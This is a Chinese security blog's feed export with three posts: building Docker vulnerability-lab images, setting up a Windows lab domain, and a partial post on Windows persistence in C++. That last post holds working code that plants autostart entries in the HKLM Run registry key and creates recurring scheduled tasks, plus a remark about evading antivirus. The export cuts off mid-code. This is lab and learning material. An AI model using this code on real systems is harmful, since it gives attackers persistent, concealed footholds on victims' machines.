class="line"></span><br><span class="line">二进制文件应用可执行权限</span><br><span class="line">sudo chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br></pre></td></tr></table></figure><p>将容器弄成靶机后，需要将容器暂停，再打包成镜像<br><a name="Xolyh"></a></p><h3 id="docker中创建储存库"><a href="#docker中创建储存库" class="headerlink" title="docker中创建储存库"></a>docker中创建储存库</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240159389-79318a66-3b79-4004-b9f8-51436a129e54.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=650&id=JaGIw&margin=%5Bobject%20Object%5D&name=image.png&originHeight=975&originWidth=2363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131388&status=done&style=none&taskId=uafc26856-b1af-4de3-a4b0-38d8886079d&title=&width=1575.3333333333333" alt="image.png"><br><a name="GbR9r"></a></p><h2 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">暂停容器</span><br><span class="line">docker <span class="keyword">stop</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt;</span><br><span class="line"></span><br><span class="line">打包成镜像</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"xx"</span> -m <span class="string">"xxxx"</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt; &lt;docker账户名称/存储库:latest&gt;</span><br><span class="line">-a 提交的镜像作者</span><br><span class="line">-m 提交时的说明文字</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"z1du"</span> -m <span class="string">"test"</span> <span class="number">4</span>cb57b89fc93  docker账户名称/ubuntutest:latest</span><br></pre></td></tr></table></figure><p><a name="aDEp8"></a></p><h3 id="docker-登录"><a href="#docker-登录" class="headerlink" title="docker 登录"></a>docker 登录</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在机器上登录docker账号</span><br><span class="line">docker <span class="keyword">login</span></span><br></pre></td></tr></table></figure><p><a name="b9HlG"></a></p><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">push </span>docker账户名称/ubuntutest</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240898090-7ac77c37-7c51-4297-a543-2216e4f48d8e.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=847&id=ue5abb09a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1271&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=180303&status=done&style=none&taskId=u5113da0e-d9a6-4fc8-9a87-c30e7169dec&title=&width=1305.3333333333333" alt="image.png"><br><a name="syD5b"></a></p><h2 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a>docker-compose.yml文件编写</h2><p>上传完后可以编写一个简单的docker-compose.yml文件，方便别人拉取你的镜像来进行漏洞复现。详细的可以看官方文档(<a href="https://docs.docker.com/compose/" target="_blank" rel="noopener">https://docs.docker.com/compose/</a>)</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"><span class="symbol"> weblogic:</span></span><br><span class="line"><span class="symbol">   image:</span> z1du/weblogic12214jdk8u181</span><br><span class="line"><span class="symbol">   ports:</span></span><br><span class="line">    - <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure><p>通过docker-compose构建靶机环境</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span>-compose <span class="keyword">build </span></span><br><span class="line"><span class="symbol">docker</span>-compose up -d</span><br></pre></td></tr></table></figure><p><a name="F93L9"></a></p><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><p>如果遇到上传不上去，一直失败，建议用代理，或者换源。可能是太大了上传时间太久，导致的问题</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a name=&quot;MRO41&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;p&gt;&lt;a name=&quot;JGWFo&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;本地为centos8（已停止维护）&quot;&gt;&lt;a href=&quot;#本地为centos8（已停止维护）&quot; class=&quot;headerlink&quot; title=&quot;本地为centos8（已停止维护）&quot;&gt;&lt;/a&gt;本地为centos8（已停止维护）&lt;/h3&gt;&lt;p&gt;&lt;a name=&quot;DpgRB&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、换华为源（阿里云源也停止维护了）&quot;&gt;&lt;a href=&quot;#1、换华为源（阿里云源也停止维护了）&quot; class=&quot;headerlink&quot; title=&quot;1、换华为源（阿里云源也停止维护了）&quot;&gt;&lt;/a&gt;1、换华为源（阿里云源也停止维护了）&lt;/h3&gt;</summary>
    
    
    
    <category term="漏洞环境" scheme="https://chenzidu.github.io/categories/%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="Docker" scheme="https://chenzidu.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>搭建域环境(小)</title>
    <link href="https://chenzidu.github.io/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
    <id>https://chenzidu.github.io/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2022-03-15T01:20:47.000Z</published>
    <updated>2024-03-11T07:48:09.651Z</updated>
    
    <content type="html"><![CDATA[<p>搭建域环境机器选择：<br>域控：Windows_server_2008_r2<br>域服务器：Windows_server_2012<br>PC机器：win7、winXP<br>推荐几个Windows Server 2008 R2镜像下载地址：</p><ul><li><a href="https://www.cnblogs.com/waw/p/4588629.html" target="_blank" rel="noopener">https://www.cnblogs.com/waw/p/4588629.html</a></li><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA" target="_blank" rel="noopener">https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA</a> 提取码：izny</li></ul><a id="more"></a><h2 id="配置AD域服务"><a href="#配置AD域服务" class="headerlink" title="配置AD域服务"></a>配置AD域服务</h2><p>下载好镜像后,添加至VM中开始安装。我这边给域控分配的是2G内存，30G储存。</p><p>选择Windows Server 2008 R2 Standard(完全安装)</p><p>选择自定义(高级)</p><p>点击下一步</p><p>等待安装</p><p>设置完账号密码后登陆，选择添加角色，选择安装Active Directory 域服务即可</p><p>添加域名，尽量不要和经常使用的重合&#x3D; &#x3D;</p><p>下一步</p><p>DNS服务器安装</p><p>是</p><p>配置IP，这台机器的IP是192.168.71.137，192.168.71.2的是VM的网关，配置完后域控就配置完了</p><h2 id="配置win7-pc机器"><a href="#配置win7-pc机器" class="headerlink" title="配置win7 pc机器"></a>配置win7 pc机器</h2><p>配置PC win7的网络，备选DNS记得选上VM的，免得域控没开，机器不能出网</p><p>在域控中查找Active Directory 用户和计算机-&gt;users-&gt;新建-&gt;用户</p><p>将域用户信息填入。</p><p>此计算机-&gt;属性-&gt;系统属性-&gt;计算机名&#x2F;域更改-&gt;选择域，填入域名，之后登陆刚刚添加的域用户账号，弹出欢迎加入域，即配置成功</p><p>遇到XP客户机加入域的问题：加入域显示不能访问网络位置。<br>要解决此问题，请启动 TCP&#x2F;IP NetBIOS 支持服务，然后加入域。<br>要启动 NetBIOS 支持服务，请按照下列步骤操作：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 使用具有管理员权限的帐户登录到客户机。</span><br><span class="line">2. 单击“开始”，单击“运行”，在“打开”框中键入 services.msc，然后单击“确定”。</span><br><span class="line">3. 在服务列表中，双击“TCP<span class="built_in">/IP </span>NetBIOS Helper Service”。</span><br><span class="line">4. 在“启动类型”列表中，单击“自动”，然后单击“应用”。</span><br><span class="line">5. 在“服务状态”下，单击“启动”以启动 TCP<span class="built_in">/IP </span>NetBIOS 支持服务。</span><br><span class="line">6. 当该服务启动后，请单击“确定”，然后退出“服务”管理单元。</span><br></pre></td></tr></table></figure><p>然后继续配置域名，登陆域账号，即可加入成功</p><p>剩下的机器按照以上配置即可，逐个加入域</p><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><p><a href="http://blog.sina.com.cn/s/blog_625999850102vpqa.html" target="_blank" rel="noopener">XP客户机加入域的问题</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;搭建域环境机器选择：&lt;br&gt;域控：Windows_server_2008_r2&lt;br&gt;域服务器：Windows_server_2012&lt;br&gt;PC机器：win7、winXP&lt;br&gt;推荐几个Windows Server 2008 R2镜像下载地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/waw/p/4588629.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/waw/p/4588629.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://msdn.itellyou.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://msdn.itellyou.cn/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA&lt;/a&gt; 提取码：izny&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="域控安装" scheme="https://chenzidu.github.io/categories/%E5%9F%9F%E6%8E%A7%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>C++提权的几种方式(win)(二)</title>
    <link href="https://chenzidu.github.io/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/"/>
    <id>https://chenzidu.github.io/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/</id>
    <published>2022-02-10T01:32:28.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>书接上回嘿嘿</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：注册表是什么?</b></p><p>A：注册表实际上是一个管理配置系统运行参数的核心数据库，它记录了安装软件与运行程序的关联关系，计算机的硬件配置等信息。可以说计算机上所有针对硬件、软件、网络的操作都是源于注册表的。可以使用 regedit.exe 这个系统提供的注册表编辑器去管理编辑注册表。</p><hr><h1 id="C-写入注册表启动项"><a href="#C-写入注册表启动项" class="headerlink" title="C++ 写入注册表启动项"></a>C++ 写入注册表启动项</h1><p><b>注意：需要重启才能重新加载注册表，这边写入的是开机自启动的注册表，代码中的刷新功能没成功（还有别的刷新注册表的方式，这边没有再去做其他尝试）。并且需要注意64与32位注册表的不同。</b></p><blockquote><p>以下尝试的几种刷新方法：</p></blockquote><ul><li>SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0); &#x2F;&#x2F;利用消息发送函数向WINDOWS发送刷新注册表的消息</li><li>PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL); &#x2F;&#x2F;模拟F5刷新</li><li>SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE); &#x2F;&#x2F;通过给第一个参数传入一个SET属性的参数可以实现部分系统刷新功能</li><li>SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L”Environment”, SMTO_ABORTIFHUNG, 3000, NULL); &#x2F;&#x2F;&#x2F;&#x2F;通知所有打开的程序注册表已修改</li></ul><blockquote><p>SendMessageTimeout与SendMessage有什么不同？</p></blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">SendMessage</span> : 如果指定窗口由调用线程创建，那么窗口过程会被当成一个子程序立即调用。如果指定窗口由另外一个线程创建，那么系统会切换到那个线程，并且调用合适的窗口过程。在线程之间传递的消息仅仅当接收线程执行<span class="variable">message</span> <span class="variable">retrieval</span> <span class="variable">code</span>才会被处理。发送线程会被堵塞直到接收线程处理完消息。但是，发送线程在等待的同时会处理收到的<span class="variable">nonqueued</span> <span class="variable">messages</span>。为了阻止这一点，使用带有<span class="variable">SMTO_BLOCK</span>参数的<span class="variable">SendMessageTimeout</span>。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">SendMessage</span>()在目标线程从其消息队列中检索到消息，然后以完整或调用的方式处理消息之前，不会退出<span class="title">ReplyMessage</span>()释放<span class="title">SendMessage</span>()同时继续处理消息。所以，如果<span class="title">SendMessage</span>()它意味着目标线程没有处理它的消息队列，这很好地表明目标线程可能在等待其他消息时处于死锁状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用<span class="title">SendMessageTimeOut</span>()，我们可以设置一个等待时间。一般情况下，这个消息应该会在这个时间会返回，但异常情况就通过这个<span class="variable">TIME</span>来帮助我们返回，从而知道对象的线程挂起而避免自己被挂起。</span></span><br></pre></td></tr></table></figure><p><b>64位的</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regedit</span><span class="params">(HKEY key, <span class="keyword">const</span> <span class="keyword">char</span>* reg_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hkResult;</span><br><span class="line"><span class="keyword">int</span> ret = RegOpenKeyEx(key, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkResult);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ret = RegSetValueEx(hkResult, key_name, <span class="number">0</span>, REG_EXPAND_SZ, (CONST BYTE*)key_value, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">RegCloseKey(hkResult);</span><br><span class="line">SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, <span class="number">0</span>, (LPARAM)<span class="string">L"Environment"</span>, SMTO_ABORTIFHUNG, <span class="number">3000</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//下面是刷新的几种方法，都没成功</span></span><br><span class="line">        <span class="comment">//SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0);</span></span><br><span class="line"><span class="comment">//PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETANIMATION, sizeof(ANIMATIONINFO), &amp;info, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">autopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* process_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line"><span class="keyword">return</span> regedit(HKEY_LOCAL_MACHINE, reg_name, key_name, process_path);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> key_name;</span><br><span class="line"><span class="built_in">string</span> process_path;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"注册项名称 文件路径\n"</span>;</span><br><span class="line">getline(<span class="built_in">cin</span>, key_name);</span><br><span class="line">getline(<span class="built_in">cin</span>, process_path);</span><br><span class="line"><span class="comment">//cout &lt;&lt; process_path;</span></span><br><span class="line"><span class="keyword">int</span> ret = autopen(key_name.c_str(), process_path.c_str());</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register succeed\n"</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"错误响应码：%d\n"</span>, ret);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><b>x86</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line">LPCTSTR lpSubKey = reg_name;</span><br><span class="line">HKEY hKey;</span><br><span class="line">REGSAM flag = KEY_WOW64_64KEY; <span class="comment">//判断是否为64位</span></span><br><span class="line">DWORD dwDisposition = REG_OPENED_EXISTING_KEY;</span><br><span class="line">LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS | flag, &amp;hKey);</span><br><span class="line"><span class="comment">//LONG lRet = ::RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, NULL, NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS, NULL, &amp;hKey, &amp;dwDisposition);  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> setPath[]= <span class="string">"C:\\Windows\\system32\\cmd.exe"</span>;</span><br><span class="line">TCHAR* pchrName = setPath;</span><br><span class="line">lRet = ::RegSetValueEx(hKey, TEXT(<span class="string">"TEST"</span>), <span class="literal">NULL</span>, REG_SZ, (LPBYTE)pchrName, <span class="number">100</span>); <span class="comment">//设置注册表项  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">::RegCloseKey(hKey); <span class="comment">//与RegCreateKeyEx配对写 </span></span><br><span class="line">PostMessage(HWND_BROADCAST, WM_COMMAND, <span class="number">41504</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="利用CMD命令行创建计划任务"><a href="#利用CMD命令行创建计划任务" class="headerlink" title="利用CMD命令行创建计划任务"></a>利用CMD命令行创建计划任务</h1><p><b>CMD 命令行下有两个命令可以创建计划任务，一个是at，另一个是schtasks。</b></p><ul><li>at 命令仅在 Win7 及以下系统有效，支持指定任务的执行时间，支持远程创建计划任务，但不能指定任务在系统启动或用户登录时启动。与schtasks命令相比，其优势是创建计划任务所需的命令比较简单。</li><li>schtasks支持 Windows 全系列系统，与at命令相比，可设置的选项更加丰富，能适应更多的应用场景，同时还允许指定任务在系统启动、用户登录甚至是系统闲置时间启动。</li></ul><p><b>缺点：at只能在windows7-以及windows 2008以下系统运行。并且调用at、sc等去做计划任务的话，容易被杀软监测到。效率比较低，可能得做好免杀。</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是at的计划任务</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmcons.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmat.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"netapi32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///计划任务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Jobadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD JobId, ret;</span><br><span class="line">    AT_INFO ai;</span><br><span class="line">    <span class="built_in">string</span> filepath;</span><br><span class="line">    <span class="built_in">string</span> RootPath;</span><br><span class="line">    <span class="built_in">string</span> Rootapp;</span><br><span class="line">    <span class="keyword">long</span> Len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; RootPath;</span><br><span class="line">    WCHAR szFilePath[<span class="number">100000</span>];</span><br><span class="line">    <span class="comment">//GetSystemDirectory(&amp;RootPath[0], MAX_PATH);</span></span><br><span class="line">    filepath = RootPath;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Rootapp;</span><br><span class="line">    filepath += Rootapp;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;ai, <span class="number">0</span>, <span class="keyword">sizeof</span>(ai));</span><br><span class="line">    Len = MultiByteToWideChar(CP_ACP, <span class="number">0</span>, filepath.c_str(), <span class="built_in">strlen</span>(filepath.c_str()), szFilePath, <span class="keyword">sizeof</span>(szFilePath));</span><br><span class="line">    szFilePath[Len] = <span class="string">'\0'</span>;</span><br><span class="line">    ai.Command = szFilePath;</span><br><span class="line">    ai.DaysOfMonth = <span class="number">0</span>;</span><br><span class="line">    ai.DaysOfWeek = <span class="number">0x7F</span>; <span class="comment">//7F等于二进制的7个1，就是每周的7天全部运行  </span></span><br><span class="line">    ai.Flags = JOB_RUN_PERIODICALLY;</span><br><span class="line">    ai.JobTime = <span class="number">22</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> + <span class="number">21</span> * <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">//22点21分，这里是以毫秒为单位的，所以需要乘这些值  </span></span><br><span class="line">    ret = NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ret &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; 